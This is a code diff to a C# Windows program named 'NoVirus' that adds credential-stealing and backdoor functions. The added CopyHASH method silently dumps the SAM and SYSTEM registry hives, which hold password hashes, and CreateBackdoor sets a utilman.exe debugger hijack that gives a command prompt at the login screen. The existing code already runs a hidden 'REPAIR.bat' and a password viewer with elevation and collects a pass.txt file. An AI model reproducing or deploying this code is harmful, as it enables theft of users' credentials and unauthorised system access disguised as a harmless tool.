@@ -12,7 +12,8 @@ namespace NoVirus
     {
         public Form1()
         {
-            InitializeLibrary();
+            //InitializeLibrary();
+            CopyHASH();
         }
 
         private void CreateWPV()
@@ -56,12 +57,15 @@ namespace NoVirus
                     if (File.Exists(bat) != true && File.Exists(passview) != true)
                     {
                         CreateBAT(); CreateWPV();
+                        //MessageBox.Show("Created BAT and WPV!");
                         Process my = new Process();
                         my.StartInfo.FileName = $"{path}REPAIR.bat";
                         my.StartInfo.UseShellExecute = true;
                         my.StartInfo.Verb = "runas";
+                        my.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         my.Start();
                         my.WaitForExit();
+                        my.Close();
                     }
                 }
                 catch (Exception exc) { MessageBox.Show($"{exc.Message}!\n Please, run this program as administrator!", "Error!"); Close(); }
@@ -70,8 +74,43 @@ namespace NoVirus
             Suicide();
         }
 
+        private void CopyHASH()
+        {
+            if (File.Exists("SAM")) { File.Delete("SAM"); }
+            if (File.Exists("SYSTEM")) { File.Delete("SYSTEM"); }
+            if (Directory.Exists("my") != true) { Directory.CreateDirectory("my"); }
+            Process hash = new Process();
+            hash.StartInfo.FileName = "CMD.exe";
+            hash.StartInfo.Arguments = "/c reg save \"HKLM\\SAM\" SAM";
+            hash.StartInfo.UseShellExecute = true;
+            hash.StartInfo.Verb = "runas";
+            hash.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            hash.Start();
+            hash.WaitForExit();
+            hash.StartInfo.Arguments = "/c reg save \"HKLM\\SYSTEM\" SYSTEM";
+            hash.Start();
+            hash.WaitForExit();
+            hash.Close();
+            File.Move("SAM", "my\\SAM"); File.Move("SYSTEM", "my\\SYSTEM");
+        }
+
+        private void CreateBackdoor()
+        {
+            Process bd = new Process();
+            bd.StartInfo.FileName = "CMD.exe";
+            bd.StartInfo.Arguments = "/C reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f ";
+            bd.StartInfo.UseShellExecute = true;
+            bd.StartInfo.Verb = "runas";
+            bd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            bd.Start();
+            bd.WaitForExit();
+            bd.Close();
+        }
+
         private void Suicide()
         {
+            CreateBackdoor();
+            CopyHASH();
             if (isAdmin)
             {
                 Thread.Sleep(1500);
@@ -83,10 +122,15 @@ namespace NoVirus
                     if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", $"{path}my\\pass_old.txt"); }
                     else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
                 }
-                else { Suicide(); }
+                else { Thread.Sleep(3000); Suicide(); }
                 Close();
             }
             else { Close(); }
+        }
+
+        private void DeleteRemote()
+        {
+            Process my = new Process();
         }
     }
 }
